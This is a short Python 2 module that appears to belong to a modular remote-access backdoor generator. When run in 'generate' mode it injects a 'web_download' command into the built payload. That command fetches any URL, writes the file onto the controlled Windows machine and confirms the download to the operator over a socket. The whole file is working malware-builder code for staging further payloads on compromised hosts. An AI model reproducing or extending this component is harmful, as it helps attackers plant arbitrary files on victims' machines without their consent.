# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from urllib2 import urlopen, unquote')
        config.functions.append('''   
def web_download(command):
    url = command.split(' ')[1]
    file_name = command.split(' ')[2]
    response = urlopen(url)
    url_data = response.read()
    f = open(file_name, 'wb')
    f.write(url_data)
    f.close()
    s.sendall('[+]Downloaded : ' + url + ' -> ' + file_name)''')
        config.logics.append('''
            elif command == "web_download":
                web_download(data)''')
    elif option == 'info':
        print '\nName             : Web download component' \
              '\nOS               : Windows' \
              '\nRequired Modules : urllib2' \
              '\nCommands         : web_download <url>' \
              '\nDescription      : Allows you to download a file from a url supplied\n'
